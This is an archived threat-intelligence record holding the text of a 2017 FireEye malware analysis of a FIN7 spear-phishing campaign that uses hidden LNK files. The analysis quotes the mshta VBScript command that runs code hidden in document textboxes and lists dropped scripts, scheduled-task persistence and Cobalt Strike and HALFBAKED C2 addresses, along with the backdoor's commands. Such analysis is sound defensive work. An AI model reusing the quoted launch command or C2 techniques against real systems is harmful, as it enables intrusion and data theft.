{
    "id": "f91cd5c9-3d84-46f3-8d91-53c424932211",
    "created_at": "2023-01-12T15:02:16.20073Z",
    "updated_at": "2025-03-27T02:16:57.879567Z",
    "deleted_at": null,
    "sha1_hash": "1269e37e6a2c2ba3c89a762b1d250a33e6ef30ae",
    "title": "2017-04-24 - FIN7 Evolution and the Phishing LNK",
    "authors": "",
    "file_creation_date": "2022-05-28T16:11:38Z",
    "file_modification_date": "2022-05-28T16:11:38Z",
    "file_size": 88942,
    "plain_text": "# FIN7 Evolution and the Phishing LNK\n\n**[fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)**\n\nThreat Research\n\nNick Carr, Saravanan Mohankumar, Yogesh Londhe, Barry Vengerik, Dominik Weber\n\nApr 24, 2017\n\n5 mins read\n\nMalware\n\nFIN7 is a financially-motivated threat group that has been associated with malicious\noperations dating back to late 2015. FIN7 is referred to by many vendors as “Carbanak\nGroup”, although we do not equate all usage of the CARBANAK backdoor with FIN7.\n[FireEye recently observed a FIN7 spear phishing campaign targeting personnel involved with](https://www.mandiant.com/resources/fin7-spear-phishing-campaign-targets-personnel-involved-sec-filings)\nUnited States Securities and Exchange Commission (SEC) filings at various organizations.\n\n\n-----\n\nIn a newly-identified campaign, FIN7 modified their phishing techniques to implement unique\ninfection and persistence mechanisms. FIN7 has moved away from weaponized Microsoft\nOffice macros in order to evade detection. This round of FIN7 phishing lures implements\nhidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by\nmshta.exe to infect the victim.\n\nIn this ongoing campaign, FIN7 is targeting organizations with spear phishing emails\ncontaining either a malicious DOCX or RTF file – two versions of the same LNK file and\nVBScript technique. These lures originate from external email addresses that the attacker\nrarely re-used, and they were sent to various locations of large restaurant chains, hospitality,\nand financial service organizations. The subjects and attachments were themed as\ncomplaints, catering orders, or resumes. As with previous campaigns, and as highlighted in\nour [annual M-Trends 2017 report, FIN7 is calling stores at targeted organizations to ensure](https://www.mandiant.com/resources/rpt-m-trends-2017)\nthey received the email and attempting to walk them through the infection process.\n\n**Infection Chain**\n\nWhile FIN7 has embedded VBE as OLE objects for over a year, they continue to update their\nscript launching mechanisms. In the current lures, both the malicious DOCX and RTF\nattempt to convince the user to double-click on the image in the document, as seen in Figure\n1. This spawns the hidden embedded malicious LNK file in the document. Overall, this is a\nmore effective phishing tactic since the malicious content is embedded in the document\ncontent rather than packaged in the OLE object.\n\nBy requiring this unique interaction – double-clicking on the image and clicking the “Open”\nbutton in the security warning popup – the phishing lure attempts to evade dynamic detection\nas many sandboxes are not configured to simulate that specific user action.\n\n\n-----\n\nMalicious FIN7 lure asking victim to double click to unlock contents\n\n\nFigure 1: Malicious FIN7 lure asking victim to double click to unlock contents\nThe malicious LNK launches “mshta.exe” with the following arguments passed to it:\n\nvbscript:Execute(\"On Error Resume Next:set w=GetObject(,\"\"Word.Application\"\"):execute\nw.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close\")\n\nThe script in the argument combines all the textbox contents in the document and executes\nthem, as seen in Figure 2.\n\n\n-----\n\nTextbox inside DOC\n\n\nFigure 2: Textbox inside DOC\nThe combined script from Word textbox drops the following components:\n\n\\Users\\[user_name]\\Intel\\58d2a83f7778d5.36783181.vbs\n\\Users\\[user_name]\\Intel\\58d2a83f777942.26535794.ps1\n\\Users\\[user_name]\\Intel\\58d2a83f777908.23270411.vbs\n\nAlso, the script creates a named schedule task for persistence to launch\n“58d2a83f7778d5.36783181.vbs” every 25 minutes.\n\n**VBScript #1**\n\nThe dropped script “58d2a83f7778d5.36783181.vbs” acts as a launcher. This VBScript\nchecks if the “58d2a83f777942.26535794.ps1” PowerShell script is running using WMI\nqueries and, if not, launches it.\n\n\n-----\n\n**PowerShell Script**\n\n“58d2a83f777942.26535794.ps1” is a multilayer obfuscated PowerShell script, which\nlaunches shellcode for a Cobalt Strike stager.\n\nThe shellcode retrieves an additional payload by connecting to the following C2 server using\nDNS:\n\naaa.stage.14919005.www1.proslr3[.]com\n\nOnce a successful reply is received from the command and control (C2) server, the\nPowerShell script executes the embedded Cobalt Strike shellcode. If unable to contact the\nC2 server initially, the shellcode is configured to reattempt communication with the C2 server\naddress in the following pattern:\n\n[a-z][a-z][a-z].stage.14919005.www1.proslr3[.]com\n\n**VBScript #2**\n\n“mshta.exe” further executes the second VBScript “58d2a83f777908.23270411.vbs”, which\ncreates a folder by GUID name inside “Intel” and drops the VBScript payloads and\nconfiguration files:\n\n\\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777638.60220156.ini\n\n\\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777688.78384945.ps1\n\n\\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f7776b5.64953395.txt\n\n\\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f7776e0.72726761.vbs\n\n\\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777716.48248237.vbs\n\n\\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777788.86541308.vbs\n\n\\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\Foxconn.lnk\n\nThis script then executes “58d2a83f777716.48248237.vbs”, which is a variant of FIN7’s\nHALFBAKED backdoor.\n\n**HALFBAKED Backdoor Variant**\n\nThe HALFBAKED malware family consists of multiple components designed to establish and\nmaintain a foothold in victim networks, with the ultimate goal of gaining access to sensitive\nfinancial information. This version of HALFBAKED connects to the following C2 server:\n\nhxxp://198[.]100.119.6:80/cd\n\nhxxp://198[.]100.119.6:443/cd\n\nhxxp://198[.]100.119.6:8080/cd\n\nThis version of HALFBAKED listens for the following commands from the C2 server:\n\n\n-----\n\n**info: Sends victim machine information (OS, Processor, BIOS and running processes)**\nusing WMI queries\n**processList: Send list of process running**\n**screenshot: Takes screen shot of victim machine (using**\n58d2a83f777688.78384945.ps1)\n**runvbs: Executes a VB script**\n**runexe: Executes EXE file**\n**runps1: Executes PowerShell script**\n**delete: Delete the specified file**\n**update: Update the specified file**\n\nAll communication between the backdoor and attacker C2 are encoded using the following\ntechnique, represented in pseudo code:\n\nFunction send_data(data)\nrandom_string = custom_function_to_generate_random_string()\nencoded_data = URLEncode(SimpleEncrypt(data))\npost_data(\"POST”, random_string & \"=\" & encoded_data, Hard_coded_c2_url,\nCreate_Random_Url(class_id))\n\nThe FireEye iSIGHT Intelligence MySIGHT Portal contains additional information based on\nour investigations of a variety of topics discussed in this post, including FIN7 and the\nHALFBAKED backdoor. Click [here for more information.](https://www.fireeye.com/advantage/threat-intelligence/subscribe)\n\n**Persistence Mechanism**\n\nFigure 3 shows that for persistence, the document creates two scheduled tasks and creates\none auto-start registry entry pointing to the LNK file.\n\n\n-----\n\nFIN7 phishing lure persistence mechanisms\n\n\nFigure 3: FIN7 phishing lure persistence mechanisms\n\n**Examining Attacker Shortcut Files**\n\nIn many cases, attacker-created LNK files can reveal valuable information about the\n[attacker’s development environment. These files can be parsed with lnk-parser to extract all](https://code.google.com/archive/p/lnk-parser/)\ncontents. LNK files have been valuable during Mandiant incident response investigations as\nthey include volume serial number, NetBIOS name, and MAC address.\n\nFor example, one of these FIN7 LNK files contained the following properties:\n\nVersion: 0\nNetBIOS name: andy-pc\nDroid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca\nDroid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268\n\n\n-----\n\nBirth droid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca\nBirth droid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268\nMAC address: 08:00:27:3d:52:68\nUUID timestamp: 03/21/2017 (12:12:28.500) [UTC]\nUUID sequence number: 2861\n\nFrom this LNK file, we can see not only what the shortcut launched within the string data, but\nthat the attacker likely generated this file on a VirtualBox system with hostname “andy-pc” on\nMarch 21, 2017.\n\n**Example Phishing Lures**\n\n**Filename: Doc33.docx**\n**MD5: 6a5a42ed234910121dbb7d1994ab5a5e**\n\n**Filename: Mail.rtf**\n**MD5: 1a9e113b2f3caa7a141a94c8bc187ea7**\n\n**FIN7 April 2017 Community Protection Event**\n\nOn April 12, in response to FIN7 actively targeting multiple clients, FireEye kicked off a\nCommunity Protection Event (CPE) – a coordinated effort by FireEye as a Service (FaaS),\nMandiant, FireEye iSight Intelligence, and our product team – to secure all clients affected by\nthis campaign.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-04-24 - FIN7 Evolution and the Phishing LNK.pdf"
    ],
    "report_names": [
        "2017-04-24 - FIN7 Evolution and the Phishing LNK.pdf"
    ],
    "threat_actors": [
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bfded1cf-be73-44f9-a391-0751c9996f9a",
            "created_at": "2022-10-25T15:50:23.337107Z",
            "updated_at": "2025-03-27T02:00:55.445946Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "FIN7",
                "GOLD NIAGARA",
                "ITG14",
                "Carbon Spider",
                "ELBRUS",
                "Sangria Tempest"
            ],
            "source_name": "MITRE:FIN7",
            "tools": [
                "Mimikatz",
                "AdFind",
                "JSS Loader",
                "HALFBAKED",
                "REvil",
                "PowerSploit",
                "CrackMapExec",
                "Carbanak",
                "Pillowmint",
                "Cobalt Strike",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRat",
                "Lizar",
                "TEXTMATE",
                "BOOSTWRITE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d85adfe3-e1c3-40b0-b8bb-d1bacadc4d82",
            "created_at": "2022-10-25T16:07:23.619566Z",
            "updated_at": "2025-03-27T02:02:09.890982Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "APT-C-11",
                "ATK 32",
                "Gold Niagara",
                "ITG14",
                "TAG-CR1"
            ],
            "source_name": "ETDA:FIN7",
            "tools": [
                "7Logger",
                "Agentemis",
                "Anunak",
                "Astra",
                "BIOLOAD",
                "BIRDWATCH",
                "Bateleur",
                "Boostwrite",
                "CROWVIEW",
                "Carbanak",
                "Cobalt Strike",
                "CobaltStrike",
                "DICELOADER",
                "DNSMessenger",
                "FOWLGAZE",
                "HALFBAKED",
                "JSSLoader",
                "KillACK",
                "LOADOUT",
                "Lizar",
                "Meterpreter",
                "Mimikatz",
                "POWERPLANT",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "TEXTMATE",
                "Tirion",
                "VB Flash",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535736,
    "ts_updated_at": 1743041817,
    "ts_creation_date": 1653754298,
    "ts_modification_date": 1653754298,
    "files": {
        "pdf": "https://archive.orkl.eu/1269e37e6a2c2ba3c89a762b1d250a33e6ef30ae.pdf",
        "text": "https://archive.orkl.eu/1269e37e6a2c2ba3c89a762b1d250a33e6ef30ae.txt",
        "img": "https://archive.orkl.eu/1269e37e6a2c2ba3c89a762b1d250a33e6ef30ae.jpg"
    }
}